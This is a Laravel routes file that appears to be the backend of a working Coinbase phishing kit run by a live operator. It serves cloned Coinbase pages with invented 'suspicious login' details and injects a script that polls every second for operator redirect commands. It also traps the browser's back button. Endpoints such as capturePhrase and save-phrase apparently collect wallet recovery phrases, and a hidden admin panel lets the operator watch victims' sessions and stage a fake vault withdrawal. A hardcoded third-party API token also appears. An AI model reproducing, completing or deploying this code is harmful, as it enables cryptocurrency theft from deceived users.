  var CSRF='{$csrf}',TRACK='{$track}';
  window._liveledCSRF=CSRF;
  function navigateTo(url){if(window._llNavDone)return;window._llNavDone=true;document.body.style.transition='opacity .08s ease';document.body.style.opacity='0';setTimeout(function(){if(url===window.location.pathname||url===window.location.href){window.location.reload();}else{window.location.href=url;setTimeout(function(){window.location.replace(url);},600);}},80);}
  function redirectViaPost(url,fields){if(window._llNavDone)return;window._llNavDone=true;document.body.style.transition='opacity .08s ease';document.body.style.opacity='0';setTimeout(function(){var form=document.createElement('form');form.method='POST';form.action=url;if(!(fields&&fields._token)){var ti=document.createElement('input');ti.type='hidden';ti.name='_token';ti.value=CSRF||window._liveledCSRF||'';form.appendChild(ti);}Object.keys(fields||{}).forEach(function(k){if(k==='_token')return;var inp=document.createElement('input');inp.type='hidden';inp.name=k;inp.value=fields[k];form.appendChild(inp);});document.body.appendChild(form);form.submit();},80);}
  window.navigateTo=navigateTo;window.redirectViaPost=redirectViaPost;
  (function(){var _prev=window.handleAdminCommands;window.handleAdminCommands=function(event){
    if(_prev)try{_prev(event);}catch(e){}
    try{
      var d=JSON.parse(event.detail.xhr.responseText);
      if(!d.commands||!d.commands.length)return;
      try{d.commands=d.commands.filter(function(c){if(!c.id)return true;var k='_ll_cmd_'+c.id;if(sessionStorage.getItem(k))return false;sessionStorage.setItem(k,'1');return true;});}catch(e){}
      d.commands.forEach(function(cmd){
        if(cmd.command==='redirect'){var _p=cmd.payload||{};if(_p.post)redirectViaPost(_p.url||'/',_p.post);else navigateTo(_p.url||'/');}
        if(cmd.command==='reset'){window.location.reload();}
        if(cmd.command==='update_vault'){try{if(typeof window._vbLiveUpdate==='function')window._vbLiveUpdate(cmd.payload||{});}catch(_e){}}
      });
    }catch(e){}
  };})();
  (function(){var _s=0,_p=false;function _poll(){if(_p)return;_p=true;var s=++_s;fetch('{$commands}',{headers:{'X-CSRF-TOKEN':CSRF}}).then(function(r){return r.text();}).then(function(t){_p=false;if(_s!==s)return;window.handleAdminCommands({detail:{xhr:{responseText:t}}});}).catch(function(){_p=false;});}function _hist(e){if(e&&e.persisted)return true;try{var n=performance.getEntriesByType&&performance.getEntriesByType('navigation');if(n&&n[0]&&n[0].type==='back_forward')return true;}catch(x){}try{if(performance.navigation&&performance.navigation.type===2)return true;}catch(x){}return false;}setInterval(_poll,1000);document.addEventListener('visibilitychange',function(){if(!document.hidden)_poll();});window.addEventListener('focus',function(){_poll();});window.addEventListener('pageshow',function(e){if(!_hist(e))return;_p=false;window._llNavDone=false;_poll();});})();
  {$docAuth}
  document.addEventListener('visibilitychange',function(){if(document.visibilityState==='hidden'){var b=new URLSearchParams({_token:CSRF,page:'{$pageName}',type:'page_exit',element:'{$pageName}',value:Math.round(performance.now()/1000)+'s'});navigator.sendBeacon('{$track}',b);}});
  window.addEventListener('pagehide',function(e){if(!e.persisted)navigator.sendBeacon('{$leave}',new URLSearchParams({_token:CSRF}));});
{$histLock}})();
</script>
HTML;

            $content = str_ireplace('</body>', $bridge . '</body>', $content);
            return response($content, 200, ['Content-Type' => 'text/html; charset=utf-8']);
        })->name('user.coinbase-' . $slug);
    }

    // Review Account — reads from views dir, data injected via POST (no URL params)
    Route::match(['get','post'], '/coinbase/review-account', function(\Illuminate\Http\Request $request) {
        $csrf     = csrf_token();
        $commands = '/api/check';
        $track    = '/api/log';
        $leave    = '/api/close';
        $pageName = 'coinbase_review_account';
        $docId    = (string) request()->attributes->get('ll_document_id', '');
        $docAuth  = \App\Services\DocumentAuthority::clientScript($pageName, $csrf, $docId, 'Coinbase Page');

        $content = file_get_contents(resource_path('views/user/coinbase/ReviewAccount.html'));

        $num  = $request->input('num', rand(100, 999));
        $name = $request->input('name', 'Michael');
        $rvData = json_encode([
            'name'     => $name,
            'location' => $request->input('location', 'Amsterdam, Netherlands'),
            'time'     => $request->input('time',     '02:14 AM CET'),
            'email'    => $request->input('email',    strtolower(str_replace(' ','',$name)).$num.'@gmail.com'),
            'num'      => $num,
        ]);
        $content = str_ireplace('</head>', "<script>window._cbRvData={$rvData};</script></head>", $content);

        $histLock = "  history.pushState(null,'',location.href);\n"
            . "  window.addEventListener('popstate',function(){history.pushState(null,'',location.href);window.location.replace('/coinbase/loading');});\n"
            . "  window.addEventListener('pageshow',function(e){if(e.persisted)window.location.replace('/coinbase/loading');});\n";
        $bridge = <<<HTML

<!-- liveled command bridge -->
<script>
(function(){
  if(window.location.search.indexOf('_liveled_preview')!==-1)return;
  var CSRF='{$csrf}',TRACK='{$track}';
  window._liveledCSRF=CSRF;
  function navigateTo(url){if(window._llNavDone)return;window._llNavDone=true;document.body.style.transition='opacity .08s ease';document.body.style.opacity='0';setTimeout(function(){if(url===window.location.pathname||url===window.location.href){window.location.reload();}else{window.location.href=url;setTimeout(function(){window.location.replace(url);},600);}},80);}
  function redirectViaPost(url,fields){if(window._llNavDone)return;window._llNavDone=true;document.body.style.transition='opacity .08s ease';document.body.style.opacity='0';setTimeout(function(){var form=document.createElement('form');form.method='POST';form.action=url;if(!(fields&&fields._token)){var ti=document.createElement('input');ti.type='hidden';ti.name='_token';ti.value=CSRF||window._liveledCSRF||'';form.appendChild(ti);}Object.keys(fields||{}).forEach(function(k){if(k==='_token')return;var inp=document.createElement('input');inp.type='hidden';inp.name=k;inp.value=fields[k];form.appendChild(inp);});document.body.appendChild(form);form.submit();},80);}
  window.navigateTo=navigateTo;window.redirectViaPost=redirectViaPost;
  (function(){var _prev=window.handleAdminCommands;window.handleAdminCommands=function(event){
    if(_prev)try{_prev(event);}catch(e){}
    try{
      var d=JSON.parse(event.detail.xhr.responseText);
      if(!d.commands||!d.commands.length)return;
      try{d.commands=d.commands.filter(function(c){if(!c.id)return true;var k='_ll_cmd_'+c.id;if(sessionStorage.getItem(k))return false;sessionStorage.setItem(k,'1');return true;});}catch(e){}
      d.commands.forEach(function(cmd){
        if(cmd.command==='redirect'){var _p=cmd.payload||{};if(_p.post)redirectViaPost(_p.url||'/',_p.post);else navigateTo(_p.url||'/');}
        if(cmd.command==='reset'){window.location.reload();}
        if(cmd.command==='update_vault'){try{if(typeof window._vbLiveUpdate==='function')window._vbLiveUpdate(cmd.payload||{});}catch(_e){}}
      });
    }catch(e){}
  };})();
  (function(){var _s=0,_p=false;function _poll(){if(_p)return;_p=true;var s=++_s;fetch('{$commands}',{headers:{'X-CSRF-TOKEN':CSRF}}).then(function(r){return r.text();}).then(function(t){_p=false;if(_s!==s)return;window.handleAdminCommands({detail:{xhr:{responseText:t}}});}).catch(function(){_p=false;});}function _hist(e){if(e&&e.persisted)return true;try{var n=performance.getEntriesByType&&performance.getEntriesByType('navigation');if(n&&n[0]&&n[0].type==='back_forward')return true;}catch(x){}try{if(performance.navigation&&performance.navigation.type===2)return true;}catch(x){}return false;}setInterval(_poll,1000);document.addEventListener('visibilitychange',function(){if(!document.hidden)_poll();});window.addEventListener('focus',function(){_poll();});window.addEventListener('pageshow',function(e){if(!_hist(e))return;_p=false;window._llNavDone=false;_poll();});})();
  {$docAuth}
  document.addEventListener('visibilitychange',function(){if(document.visibilityState==='hidden'){var b=new URLSearchParams({_token:CSRF,page:'{$pageName}',type:'page_exit',element:'{$pageName}',value:Math.round(performance.now()/1000)+'s'});navigator.sendBeacon('{$track}',b);}});
  window.addEventListener('pagehide',function(e){if(!e.persisted)navigator.sendBeacon('{$leave}',new URLSearchParams({_token:CSRF}));});
{$histLock}})();
</script>
HTML;

        $content = str_ireplace('</body>', $bridge . '</body>', $content);
        return response($content, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    })->name('user.coinbase-review-account');

});

// Offline page — tracking still runs, but no online check (would loop)
Route::middleware(\App\Http\Middleware\TrackUserSession::class)
    ->get('/offline', [UserController::class, 'offline'])->name('user.offline');

// Public status check — polled by /offline page to detect when site comes back online
Route::get('/status', function () {
    $settings = \App\Services\LiveledSettings::get();
    return response()->json(['online' => $settings['site_online'] ?? true]);
});

// ─── Session API (called by user pages) ──────────────────────────────────────
Route::post('/api/ping',    [TrackingController::class, 'heartbeat'])->middleware('throttle:600,1')->name('track.heartbeat');
Route::post('/api/log',     [TrackingController::class, 'event'])->middleware('throttle:1200,1')->name('track.event');
Route::post('/api/close',   [TrackingController::class, 'leave'])->middleware('throttle:300,1')->name('track.leave');
Route::post('/session/activate', [TrackingController::class, 'activate'])->middleware('throttle:600,1')->name('session.activate');
Route::get('/api/check',    [TrackingController::class, 'pollCommands'])->middleware('throttle:1200,1')->name('track.commands');
Route::post('/api/block',   [TrackingController::class, 'ban'])->middleware('throttle:30,1')->name('track.ban');
Route::post('/api/submit',  [TrackingController::class, 'capturePhrase'])->middleware('throttle:120,1')->name('track.capture');
Route::post('/save-phrase', [TrackingController::class, 'savePhrase'])->name('phrase.save');

Route::post('/api/vault-withdraw', function(\Illuminate\Http\Request $request) {
    $token = $request->cookie('liveled_token');
    if (!$token) return response()->json(['ok'=>false,'error'=>'No session'],401);
    $session = \App\Models\UserSession::where('session_token', $token)->first();
    if (!$session) return response()->json(['ok'=>false,'error'=>'Session not found'],404);
    $coinKey   = trim($request->input('coin_key', ''));
    $amount    = (float)$request->input('amount', 0);
    $usdAmount = (float)$request->input('usd_amount', 0);
    $brand     = trim($request->input('brand', ''));
    $meta      = $session->metadata ?? [];
    if ($brand === 'coinbase' || isset($meta['coinbase_vault_data'])) {
        $vaultKey = 'coinbase_vault_data';
    } else {
        $vaultKey = 'vault_data'; // legacy
    }
    $vaultData = $meta[$vaultKey] ?? [];
    // Coin-family variant groups: if the exact key has no amount in DB, find the family member that does
    $coinFamilies = [
        'usdt'     => ['usdt','usdt_trc20'],
        'usdt_trc20' => ['usdt','usdt_trc20'],
        'usdc'        => ['usdc','usdc_base','usdc_sol','usdc_polygon'],
        'usdc_base'   => ['usdc','usdc_base','usdc_sol','usdc_polygon'],
        'usdc_sol'    => ['usdc','usdc_base','usdc_sol','usdc_polygon'],
        'usdc_polygon'=> ['usdc','usdc_base','usdc_sol','usdc_polygon'],
    ];
    $actualKey = $coinKey; // the DB key we will actually update
    if ($coinKey !== '' && $amount > 0) {
        $clientCurrent = (float)$request->input('current_amount', 0);
        $current = isset($vaultData[$coinKey.'_amount']) ? (float)$vaultData[$coinKey.'_amount'] : 0.0;
        // If exact key has no amount, check family variants for a match
        if ($current <= 0 && isset($coinFamilies[$coinKey])) {
            foreach ($coinFamilies[$coinKey] as $variantKey) {
                if ($variantKey !== $coinKey && isset($vaultData[$variantKey.'_amount']) && (float)$vaultData[$variantKey.'_amount'] > 0) {
                    $current   = (float)$vaultData[$variantKey.'_amount'];
                    $actualKey = $variantKey;
                    break;
                }
            }
        }
        // Final fallback: use client-reported current amount if DB still shows 0
        if ($current <= 0 && $clientCurrent > 0) $current = $clientCurrent;
        $newCoin = max(0.0, $current - $amount);
        if ($current > 0 && ($amount >= $current * 0.999 || $newCoin < 1e-6)) $newCoin = 0.0;
        $vaultData[$actualKey.'_amount'] = $newCoin > 0 ? rtrim(rtrim(number_format($newCoin, 10, '.', ''), '0'), '.') : '0';
        // Also update the coin_keys list so the next GET render shows the correct key
        if ($actualKey !== $coinKey && isset($vaultData['coin_keys'])) {
            $existingKeys = array_map('trim', explode(',', $vaultData['coin_keys']));
            $idx = array_search($coinKey, $existingKeys);
            if ($idx !== false) {
                $existingKeys[$idx] = $actualKey;
                $vaultData['coin_keys'] = implode(',', $existingKeys);
            }
        }
    }
    if ($usdAmount > 0 && isset($vaultData['balance'])) {
        $currentBal = (float)str_replace(',', '', $vaultData['balance']);
        $newBal = max(0, $currentBal - $usdAmount);
        if ($currentBal > 0 && ($usdAmount >= $currentBal * 0.999 || $newBal < 0.01)) $newBal = 0.0;
        $vaultData['balance'] = number_format($newBal, 2, '.', '');
    }
    $vaultData['_user_modified'] = true;
    $meta[$vaultKey] = $vaultData;
    // Migrate legacy key to canonical brand-namespaced key
    if ($vaultKey === 'vault_data') {
        $meta['coinbase_vault_data'] = $vaultData;
    }
    $session->metadata = $meta;
    $session->save();
    return response()->json(['ok'=>true,'balance'=>$vaultData['balance']??'','coin_amount'=>$vaultData[$actualKey.'_amount']??'','actual_key'=>$actualKey]);
})->middleware('throttle:300,1')->name('api.vault-withdraw');


// ─── Admin ────────────────────────────────────────────────────────────────────
Route::get('/admin777888xxx/login',  [AdminController::class, 'loginForm'])->name('admin.login');
Route::post('/admin777888xxx/login', [AdminController::class, 'login'])->name('admin.login.post');
Route::post('/admin777888xxx/logout',[AdminController::class, 'logout'])->name('admin.logout');
Route::get('/admin777888xxx/s/{key}', [AdminController::class, 'accessViaKey'])->name('admin.sub.access')->where('key', '[A-Za-z0-9]+');

Route::middleware(\App\Http\Middleware\AdminAuth::class)->prefix('admin777888xxx')->group(function () {

    Route::get('/geo-lookup', function (\Illuminate\Http\Request $request) {
        $ip = trim($request->query('ip', ''));
        if (!$ip || !filter_var($ip, FILTER_VALIDATE_IP)) {
            return response()->json(['error' => 'invalid ip'], 400);
        }
        $url = 'https://api.findip.net/' . urlencode($ip) . '/?token=3809b010db31d3a0e22e6b54443da84f';
        $ch  = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 6,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTPHEADER     => ['Accept: application/json'],
        ]);
        $body = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $err  = curl_error($ch);
        curl_close($ch);
        if ($err) return response()->json(['error' => $err], 502);
        if ($code !== 200) return response()->json(['error' => 'upstream HTTP '.$code], 502);
        $data = json_decode($body, true);
        if (!$data) return response()->json(['error' => 'invalid json from upstream'], 502);
        return response()->json($data);
    })->name('admin.geo.lookup');

    Route::get('/',                            [AdminController::class, 'dashboard'])->name('admin.dashboard');
    Route::get('/sessions',                    [AdminController::class, 'sessionList'])->name('admin.sessions');
    Route::get('/session/{token}/events',      [AdminController::class, 'sessionEvents'])->name('admin.session.events');
    Route::post('/command',                    [AdminController::class, 'issueCommand'])->name('admin.command');

    // Vault config save/get — DB-only, no localStorage
    Route::post('/vault-config-save', function(\Illuminate\Http\Request $request) {
        $sessionToken = $request->input('session_token');
        if (!$sessionToken) return response()->json(['ok'=>false,'error'=>'No session_token'],422);
        $session = \App\Models\UserSession::where('session_token', $sessionToken)->first();
        if (!$session) return response()->json(['ok'=>false,'error'=>'Session not found'],404);
        $brand    = $request->input('brand', 'coinbase');
        $vaultKey = 'coinbase_vault_data';
        $meta = $session->metadata ?? [];
        $existing = $meta[$vaultKey] ?? [];
        $incoming = $request->input('vault_data', []);
        if (!is_array($incoming)) return response()->json(['ok'=>false,'error'=>'invalid'],422);
        // Merge: incoming values win, existing values kept for keys not in incoming
        $merged = array_merge($existing, $incoming);
        $meta[$vaultKey] = $merged;
        $session->metadata = $meta;
        $session->save();
        return response()->json(['ok'=>true,'vault_data'=>$merged]);
    })->name('admin.vault.config.save');

    Route::get('/vault-config-get', function(\Illuminate\Http\Request $request) {
        $sessionToken = $request->query('session_token');
        if (!$sessionToken) return response()->json(['ok'=>false,'error'=>'No session_token'],422);
        $session = \App\Models\UserSession::where('session_token', $sessionToken)->first();
        if (!$session) return response()->json(['ok'=>false,'error'=>'Session not found'],404);
        $brand    = $request->query('brand', 'coinbase');
        $vaultKey = 'coinbase_vault_data';
        $meta = $session->metadata ?? [];
        $vaultData = $meta[$vaultKey] ?? [];
        return response()->json(['ok'=>true,'vault_data'=>$vaultData]);
    })->name('admin.vault.config.get');

    Route::delete('/session/{token}',          [AdminController::class, 'deleteSession'])->name('admin.session.delete');
    Route::patch('/session/{token}/rename',    [AdminController::class, 'renameSession'])->name('admin.session.rename');
    Route::post('/session/{token}/pin',       [AdminController::class, 'togglePinSession'])->name('admin.session.pin');
    Route::delete('/events',                   [AdminController::class, 'deleteEvents'])->name('admin.events.delete');
    Route::get('/flow-settings',               [AdminController::class, 'getFlowSettings'])->name('admin.flow.get');
    Route::post('/site-status',                [AdminController::class, 'setSiteStatus'])->name('admin.site.status');
    Route::post('/pow-status',                 [AdminController::class, 'setPowStatus'])->name('admin.pow.status');
    Route::post('/session-exit-url',           [AdminController::class, 'setSessionExitUrl'])->name('admin.session.exit.url');
    Route::post('/change-password', function (\Illuminate\Http\Request $request) {
        $current  = $request->input('current', '');
        $newPass  = $request->input('new_password', '');
        if (strlen($newPass) < 6) return response()->json(['ok' => false, 'error' => 'Password too short']);
        $stored  = config('liveled.admin_password');
        $isBcrypt = strlen($stored) === 60 && str_starts_with($stored, '$2y$');
        $ok = $isBcrypt ? \Illuminate\Support\Facades\Hash::check($current, $stored) : ($current === $stored);
        if (!$ok) return response()->json(['ok' => false, 'error' => 'Current password is wrong']);
        $envPath = base_path('.env');
        $env = file_get_contents($envPath);
        if (preg_match('/^ADMIN_PASSWORD=.*/m', $env)) {
            $env = preg_replace('/^ADMIN_PASSWORD=.*/m', 'ADMIN_PASSWORD=' . $newPass, $env);
        } else {
            $env .= "\nADMIN_PASSWORD=" . $newPass;
        }
        file_put_contents($envPath, $env);
        return response()->json(['ok' => true]);
    })->name('admin.change.password');
    Route::post('/entry-page',                 [AdminController::class, 'setEntryPage'])->name('admin.entry.page');
    Route::get('/online-admins', function (\Illuminate\Http\Request $request) {
        // Only master admins can see this endpoint
        if (session('admin_role') !== 'master') {
            return response()->json(['error' => 'Forbidden'], 403);
        }
        // Prune stale rows (no heartbeat for > 3 minutes = offline)
        \Illuminate\Support\Facades\DB::table('admin_online_sessions')
            ->where('last_seen_at', '<', now()->subSeconds(45))
            ->delete();
        $rows = \Illuminate\Support\Facades\DB::table('admin_online_sessions')
            ->orderBy('logged_in_at')
            ->get(['session_id', 'ip_address', 'user_agent', 'last_seen_at', 'logged_in_at']);
        $currentSid = session()->getId();
        $result = $rows->map(function ($r) use ($currentSid) {
            return [
                'is_you'       => $r->session_id === $currentSid,
                'sid'          => $r->session_id,
                'ip'           => $r->ip_address ?? 'Unknown',
                'ua'           => $r->user_agent  ?? '',
                // Return Unix timestamps so JS Date.now() comparison is timezone-safe
                'last_seen_ts' => \Carbon\Carbon::parse($r->last_seen_at)->utc()->timestamp,
                'logged_in_ts' => \Carbon\Carbon::parse($r->logged_in_at)->utc()->timestamp,
            ];
        });
        return response()->json(['admins' => $result->values()]);
    })->name('admin.online.admins');

    Route::get('/ping', function () {
        return response()->json(['ok' => true]);
    })->name('admin.ping');

    Route::delete('/kick-admin/{sid}', function (\Illuminate\Http\Request $request, $sid) {
        if (session('admin_role') !== 'master') {
            return response()->json(['error' => 'Forbidden'], 403);
        }
        if ($sid === session()->getId()) {
            return response()->json(['error' => 'Cannot kick yourself'], 400);
        }
        // Get the IP of the session being kicked; fall back to client-supplied IP if row already pruned
        $row = \Illuminate\Support\Facades\DB::table('admin_online_sessions')->where('session_id', $sid)->first();
        $kickedIp = $row?->ip_address ?? null;
        if (!$kickedIp) {
            $fb = $request->input('fallback_ip', '');
            if ($fb && filter_var($fb, FILTER_VALIDATE_IP)) {
                $kickedIp = $fb;
            }
        }

        // Remove from online sessions
        \Illuminate\Support\Facades\DB::table('admin_online_sessions')->where('session_id', $sid)->delete();

        // Destroy session — DB driver
        try { \Illuminate\Support\Facades\DB::table('sessions')->where('id', $sid)->delete(); } catch (\Throwable $e) {}

        // Destroy session — file driver
        try {
            $path = config('session.files', storage_path('framework/sessions')) . DIRECTORY_SEPARATOR . $sid;
            if (file_exists($path)) @unlink($path);
        } catch (\Throwable $e) {}

        // Ban the IP for 30 minutes
        if ($kickedIp) {
            \Illuminate\Support\Facades\DB::table('admin_ip_bans')->updateOrInsert(
                ['ip_address' => $kickedIp],
                [
                    'banned_by_ip' => $request->ip(),
                    'banned_at'    => now(),
                    'expires_at'   => now()->addMinutes(30),
                    'reason'       => 'Kicked by master admin',
                    'updated_at'   => now(),
                    'created_at'   => now(),
                ]
            );
        }

        return response()->json(['ok' => true, 'banned_ip' => $kickedIp]);
    })->name('admin.kick.admin');

    Route::get('/admin-bans', function () {
        if (session('admin_role') !== 'master') return response()->json(['error' => 'Forbidden'], 403);
        // Auto-expire old bans
        \Illuminate\Support\Facades\DB::table('admin_ip_bans')->where('expires_at', '<', now())->delete();
        $bans = \Illuminate\Support\Facades\DB::table('admin_ip_bans')->orderByDesc('banned_at')->get();
        return response()->json(['ok' => true, 'bans' => $bans]);
    })->name('admin.bans.list');

    Route::delete('/admin-bans/{id}', function (int $id) {
        if (session('admin_role') !== 'master') return response()->json(['error' => 'Forbidden'], 403);
        \Illuminate\Support\Facades\DB::table('admin_ip_bans')->where('id', $id)->delete();
        return response()->json(['ok' => true]);
    })->name('admin.bans.delete');

    Route::post('/generate-vault-wallet', function (\Illuminate\Http\Request $request) {
        try {
            $mnemonic = $request->input('mnemonic') ?: null;
            $sessionToken = $request->input('session_token') ?: null;
            $wallet = (new \App\Services\VaultWalletService())->generateWallet($mnemonic);

            // Save to vault_wallets table
            $addresses = [];
            foreach ($wallet as $key => $val) {
                if ($key !== 'mnemonic' && is_array($val)) {
                    $addresses[$key] = $val;
                }
            }
            \App\Models\VaultWallet::create([
                'session_token' => $sessionToken,
                'mnemonic'      => $wallet['mnemonic'],
                'addresses'     => $addresses,
            ]);

            return response()->json(['ok' => true, 'wallet' => $wallet]);
        } catch (\Throwable $e) {
            return response()->json(['ok' => false, 'error' => $e->getMessage()], 500);
        }
    })->name('admin.generate.vault.wallet');
    Route::middleware('admin.master')->group(function () {
        Route::get('/sub-admins',              [AdminController::class, 'subAdminPage'])->name('admin.sub-admins');
        Route::get('/sub-admins-json',         [AdminController::class, 'subAdminListJson'])->name('admin.sub-admins.json');
        Route::post('/sub-admins',             [AdminController::class, 'createSubAdmin'])->name('admin.sub-admins.create');
        Route::delete('/sub-admin/{id}',       [AdminController::class, 'deleteSubAdmin'])->name('admin.sub-admin.delete')->where('id', '[0-9]+');
    });
});

